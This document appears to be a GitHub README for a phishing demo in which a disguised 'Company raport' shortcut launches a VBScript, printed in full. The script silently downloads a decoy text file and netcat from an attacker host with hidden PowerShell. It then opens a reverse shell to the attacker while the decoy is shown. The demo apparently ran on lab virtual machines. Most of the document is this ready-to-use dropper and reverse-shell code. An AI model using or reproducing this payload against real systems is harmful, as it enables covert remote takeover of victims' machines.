When the Company raport shortcut is clicked, connection is set to download fake raport.txt file and netcat from the attacker. When the downloads are done, raport.txt opens while reverse shell is being cooked in the background.

See it in action: https://www.youtube.com/watch?v=ll4ojo6q-rM

Demo was made using 2 virtual machines:

    Kali Linux
    Windows 10

Structure:
Company raport .lnk -> Linked to revsh.vbs inside hidden payload folder

![efROc8J](https://github.com/therealhalonen/PhishSticks/assets/112076418/54cea3ed-6872-4f69-a483-2e6586fe12f6)
![nor5dNd](https://github.com/therealhalonen/PhishSticks/assets/112076418/8ef95081-a269-4667-8b0f-cf9cfb8eb2a5) 

revsh.vbs:

```vbs
Set objShell = CreateObject("Wscript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Download fake raport
downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('<ATTACKER IP>/raport.txt', '%TEMP%\raport.txt')"""
objShell.Run downloadRaport, 0, True
    WScript.Sleep 1000  ' Wait for 1 second

' Open raport.txt
openRaport = "cmd /c start """" %TEMP%\raport.txt"
objShell.Run openRaport, 0, True

' Download netcat from attacker ip
downloadCmd = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER IP>/nc64.exe', '%TEMP%\nc64.exe')"""
objShell.Run downloadCmd, 0, True
WScript.Sleep 2000 ' Wait for 2 seconds initially (adjust this if needed)

' Wait until the file has been downloaded
Do While Not objFSO.FileExists(objShell.ExpandEnvironmentStrings("%TEMP%\nc64.exe"))
    WScript.Sleep 1000  ' Wait for 1 second
Loop

' Start reverse shell
execCmd = "cmd /c powershell -WindowStyle Hidden -Command ""Start-Process \""%TEMP%\nc64.exe\"" -ArgumentList '<ATTACK IP>', '<ATTACKER PORT>', '-e', 'powershell' -WindowStyle Hidden"""
objShell.Run execCmd, 0, True

Set objFSO = Nothing
Set objShell = Nothing
```

Both Virtual Machines were assigned to the same internal network, and the IP-address of the attacker machine was placed as a static in the payload command. Attacker machine was set to host raport.txt & nc64.exe  and open up netcat listener:

![2023-11-23_10-54](https://github.com/therealhalonen/PhishSticks/assets/112076418/3e9ea4b2-4ff3-4798-90d6-3dc368e22d44)

